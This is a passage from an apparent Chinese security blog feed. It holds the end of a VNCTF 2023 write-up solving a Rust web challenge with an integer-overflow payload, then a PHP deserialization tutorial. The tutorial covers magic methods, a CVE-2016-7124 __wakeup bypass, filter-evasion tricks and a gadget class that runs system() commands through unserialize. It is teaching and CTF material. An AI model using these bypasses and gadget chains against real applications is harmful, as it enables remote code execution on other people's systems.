class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span>,<br>    cost: <span class="hljs-type">i32</span>,<br>&#125;<br><br><span class="hljs-keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Cost&quot;</span>,<br>        cost: <span class="hljs-number">10</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Loan&quot;</span>,<br>        cost: -<span class="hljs-number">1_000</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;CCCCCost&quot;</span>,<br>        cost: <span class="hljs-number">500</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Donate&quot;</span>,<br>        cost: <span class="hljs-number">1</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Sleep&quot;</span>,<br>        cost: <span class="hljs-number">0</span>,<br>    &#125;,<br>];<br><br><span class="hljs-meta">#[get(<span class="hljs-string">&quot;/&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;HttpResponse, Error&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">context</span> = Context::<span class="hljs-title function_ invoke__">new</span>();<br><br>    context.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">&quot;gongde&quot;</span>, &amp;GONGDE.<span class="hljs-title function_ invoke__">get</span>());<br><br>    <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &gt; <span class="hljs-number">1_000_000_000</span> &#123;<br>        context.<span class="hljs-title function_ invoke__">insert</span>(<br>            <span class="hljs-string">&quot;flag&quot;</span>,<br>            &amp;std::env::<span class="hljs-title function_ invoke__">var</span>(<span class="hljs-string">&quot;FLAG&quot;</span>).<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|_| <span class="hljs-string">&quot;flag&#123;test_flag&#125;&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>()),  <span class="hljs-comment">//这里出flag</span><br>        );<br>    &#125;<br><br>    <span class="hljs-keyword">match</span> tera.<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">&quot;index.html&quot;</span>, &amp;context) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(body) =&gt; <span class="hljs-title function_ invoke__">Ok</span>(HttpResponse::<span class="hljs-title function_ invoke__">Ok</span>().<span class="hljs-title function_ invoke__">body</span>(body)),<br>        <span class="hljs-title function_ invoke__">Err</span>(err) =&gt; <span class="hljs-title function_ invoke__">Err</span>(error::<span class="hljs-title function_ invoke__">ErrorInternalServerError</span>(err)),<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#[get(<span class="hljs-string">&quot;/reset&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">reset</span>() <span class="hljs-punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;<br>    GONGDE.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-number">0</span>);<br>    web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>        success: <span class="hljs-literal">true</span>,<br>        message: <span class="hljs-string">&quot;重开成功，继续挑战佛祖吧&quot;</span>,<br>    &#125;)<br>&#125;<br><br><span class="hljs-meta">#[post(<span class="hljs-string">&quot;/upgrade&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">upgrade</span>(body: web::Form&lt;Info&gt;) <span class="hljs-punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;<br>    <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &lt; <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>            success: <span class="hljs-literal">false</span>,<br>            message: <span class="hljs-string">&quot;功德都搞成负数了，佛祖对你很失望&quot;</span>,<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> body.quantity &lt;= <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>            success: <span class="hljs-literal">false</span>,<br>            message: <span class="hljs-string">&quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;</span>,<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Some</span>(payload) = PAYLOADS.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">find</span>(|u| u.name == body.name) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cost</span> = payload.cost;<br><br>        <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> || payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>            cost *= body.quantity;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &lt; cost <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">false</span>,<br>                message: <span class="hljs-string">&quot;功德不足&quot;</span>,<br>            &#125;);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> cost != <span class="hljs-number">0</span> &#123;<br>            GONGDE.<span class="hljs-title function_ invoke__">set</span>(GONGDE.<span class="hljs-title function_ invoke__">get</span>() - cost <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;小扣一手功德&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;CCCCCost&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;功德都快扣没了，怎么睡得着的&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Loan&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;好人有好报&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Sleep&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;这是什么？床，睡一下&quot;</span>,<br>            &#125;);<br>        &#125;<br>    &#125;<br><br>    web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>        success: <span class="hljs-literal">false</span>,<br>        message: <span class="hljs-string">&quot;禁止开摆&quot;</span>,<br>    &#125;)<br>&#125;<br><br><span class="hljs-meta">#[actix_web::main]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> std::io::<span class="hljs-type">Result</span>&lt;()&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">port</span> = std::env::<span class="hljs-title function_ invoke__">var</span>(<span class="hljs-string">&quot;PORT&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|_| <span class="hljs-string">&quot;2333&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>())<br>        .<span class="hljs-title function_ invoke__">parse</span>()<br>        .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Invalid PORT&quot;</span>);<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Listening on 0.0.0.0:&#123;&#125;&quot;</span>, port);<br><br>    HttpServer::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-keyword">move</span> || &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">tera</span> = <span class="hljs-keyword">match</span> Tera::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;src/templates/**/*.html&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Ok</span>(t) =&gt; t,<br>            <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>                <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Error: &#123;&#125;&quot;</span>, e);<br>                ::std::process::<span class="hljs-title function_ invoke__">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;;<br>        App::<span class="hljs-title function_ invoke__">new</span>()<br>            .<span class="hljs-title function_ invoke__">app_data</span>(web::Data::<span class="hljs-title function_ invoke__">new</span>(tera))<br>            .<span class="hljs-title function_ invoke__">service</span>(Files::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;/asset&quot;</span>, <span class="hljs-string">&quot;src/templates/asset/&quot;</span>).<span class="hljs-title function_ invoke__">prefer_utf8</span>(<span class="hljs-literal">true</span>))<br>            .<span class="hljs-title function_ invoke__">service</span>(index)<br>            .<span class="hljs-title function_ invoke__">service</span>(upgrade)<br>            .<span class="hljs-title function_ invoke__">service</span>(reset)<br>    &#125;)<br>    .<span class="hljs-title function_ invoke__">bind</span>((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port))?<br>    .<span class="hljs-title function_ invoke__">run</span>()<br>    .<span class="hljs-keyword">await</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>当<code>GONGDE&gt;1000000000</code>时，访问/就可以出flag，所以现在就是要加功德</p><p>这个就想起之前做的溢出</p><p>看到quantity用的是i32数据类型，查一下i32数据范围</p><img src="/2023/02/19/VNCTF2023/1.png" class=""><p>再看到<code>/upgrade</code>发现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Some</span>(payload) = PAYLOADS.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">find</span>(|u| u.name == body.name) &#123;<br>       <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cost</span> = payload.cost;<br><br>       <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> || payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>           cost *= body.quantity;<br>       &#125;<br></code></pre></td></tr></table></figure><p>这里可以改变cost，从而改变<code>GONGDE</code>,因此可以构造payload:<code>name=Cost&amp;quantity=214748365</code></p><img src="/2023/02/19/VNCTF2023/2.png" class="">]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化</title>
    <link href="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h3><h4 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h4><p>类是定义一系列属性和操作的模板，而对象就是把属性进行实例化，完事交给类里面的方法进行处理。</p><p>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。</p><p>反序列化则相反将字符串重新恢复成对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">animal</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;dahuang&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;is sleeping...\n&quot;</span>;    &#125;<br>&#125;<br><span class="hljs-variable">$dog</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">animal</span>();<br><span class="hljs-variable">$dog</span>-&gt;<span class="hljs-title function_ invoke__">sleep</span>();<br><span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$dog</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$tmp</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso">dahuangis sleeping<span class="hljs-params">...</span><br><span class="hljs-built_in">string</span>(<span class="hljs-number">42</span>) <span class="hljs-string">&quot;O:6:&quot;</span>animal<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:7:&quot;</span>dahuang<span class="hljs-string">&quot;;&#125;&quot;</span><br>class animal#2 (<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-keyword">public</span> $name =&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;dahuang&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上述简单的代码中，定义了一个<code>animal</code>类，在animal类中定义了一个<code>$name</code>变量和一个<code>sleep</code>方法；然后对<code>animal</code>类实例化，创建一个<code>dog</code>对象，通果<code>dog</code>对象调用<code>sleep</code>方法，输出。将类数列化之后输出，将序列化反序列化后输出。</p><p>要想实现反序列化漏洞，就必须有<code>unserilize()</code>并且参数可控和魔法函数</p><h4 id="三种权限的属性序列化"><a class="markdownIt-Anchor" href="#三种权限的属性序列化"></a> 三种权限的属性序列化</h4><h5 id="public"><a class="markdownIt-Anchor" href="#public"></a> public</h5><p>public的属性，可以在类外面和里面访问，序列化后的值就是属性的名称和对应的值</p><p><code>O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N;&#125;</code></p><p>解读：O代表这是一个对象，4代表对象名称的长度，2代表成员个数。大括号中分别是：属性名类型、长度、名称;值类型、长度、值。</p><h5 id="private"><a class="markdownIt-Anchor" href="#private"></a> private</h5><p>private的属性，只能在类里面访问，序列化后的值为%00类名%00属性名</p><p><code>O:4:&quot;Test&quot;:2:&#123;s:4:&quot;%00Test%00test&quot;;s:2:&quot;ok&quot;;s:3:&quot;%00Test%00var&quot;;N;&#125;</code></p><h5 id="protected"><a class="markdownIt-Anchor" href="#protected"></a> protected</h5><p>protected的属性，只能在本类、子类、父类中访问，序列化后的值为%00*%00属性名</p><p><code>O:4:&quot;Test&quot;:2:&#123;s:4:&quot;%00*%00test&quot;;s:2:&quot;ok&quot;;s:3:&quot;%00*%00var&quot;;N;&#125;</code></p><p>对于private和protected 序列化之后需要进行urlencode(),不然空白符会丢</p><h4 id="魔法函数"><a class="markdownIt-Anchor" href="#魔法函数"></a> 魔法函数</h4><img src="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class=""><p>以下代码体验一下各种魔法函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 设置一个类A</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;V0W&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct() call\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n__destruct() call\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;__toString() call\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep() call\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">function__wakeup</span>()<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup() call\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get() call\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$property</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n__set() call\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$property</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke() call\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//调用 __construct()</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><br><span class="hljs-comment">//调用 __toSting() //file_exists函数也能够触发__toString</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-comment">//调用 __sleep()</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//调用 __wakeup()</span><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-comment">//不存在这个bbbb属性，调用 __get()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>-&gt;bbbb;<br><br><span class="hljs-comment">//name是私有变量，不允许修改，调用 __set()</span><br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-string">&quot;pro&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>-&gt;name;<br><span class="hljs-comment">//将对象作为函数，调用 __invoke()</span><br><span class="hljs-variable">$a</span>();<br><br><span class="hljs-comment">//程序结束，调用 __destruct() (会调用两次__destruct，因为中间有一次反序列化)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>若为了防止调用__wakeup，可以用CVE-2016-7124绕过</p><p>影响版本：</p><blockquote><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p></blockquote><h4 id="arrayaccess接口"><a class="markdownIt-Anchor" href="#arrayaccess接口"></a> ArrayAccess接口</h4><p>ArrayAccess接口定义了4个方法offsetGet、offsetSet、offsetExists 和 offsetUnset</p><p>继承ArrayAccess接口的类当出现一下四种情况会分别调用相应的方法</p><ul><li>用于获取数组中的元素值。当使用类似<code>$obj[$key]</code>的方式访问对象属性时，会触发offsetGet</li><li>用于给数组中的元素赋值。会触发offsetSet</li><li>当使用<code>isset</code>或<code>empty</code>检查对象属性是否存在时，会触发offsetExists</li><li>当使用<code>unset</code>删除对象属性时，会触发当使用<code>unset</code>删除对象属性时</li></ul><h3 id="pop链构造"><a class="markdownIt-Anchor" href="#pop链构造"></a> pop链构造</h3><p>构造思路</p><ol><li>起点</li><li>跳板</li><li>代码执行</li></ol><p>链尾一般是有漏洞的函数，或者利用获取flag 的函数，可以从链尾反推，断了就可以正推，从必然会执行的函数可以推起</p><h3 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h3><h4 id="hex绕过"><a class="markdownIt-Anchor" href="#hex绕过"></a> hex绕过</h4><p>得到序列化后的字符串后，手动把要编码的字符改为<code>\十六进制</code></p><p>反序列化中为了避免信息丢失，使用大写S支持字符串的编码</p><p>如<code>s:8:&quot;flag.php&quot;-&gt;S:8:&quot;\66lag.php&quot;</code></p><h4 id="开头被过滤"><a class="markdownIt-Anchor" href="#开头被过滤"></a> 开头被过滤</h4><p><a href="https://www.cnblogs.com/HexNy0a/articles/16932108.html">https://www.cnblogs.com/HexNy0a/articles/16932108.html</a></p><p>php可反序列化类型有String,Integer,Boolean,Null,Array,Object</p><p>若过滤<code>'/O:\d:/'</code>则可以通过<code>O:+数字xxx</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br> <br><span class="hljs-comment">// a:1:&#123;i:0;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span><br><span class="hljs-variable">$array</span> = [<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">c</span>()];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br> <br><span class="hljs-comment">// C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;a:1:&#123;i:0;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>();<br><span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">c</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br> <br><span class="hljs-comment">// C:16:&quot;SplObjectStorage&quot;:54:&#123;x:i:1;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;,N;;m:a:0:&#123;&#125;&#125;</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplObjectStorage</span>();<br><span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">attach</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">c</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br> <br><span class="hljs-comment">// C:8:&quot;SplStack&quot;:41:&#123;i:6;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplStack</span>();<br><span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">c</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br> <br><span class="hljs-comment">// C:8:&quot;SplQueue&quot;:41:&#123;i:4;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplQueue</span>();<br><span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">enqueue</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">c</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ 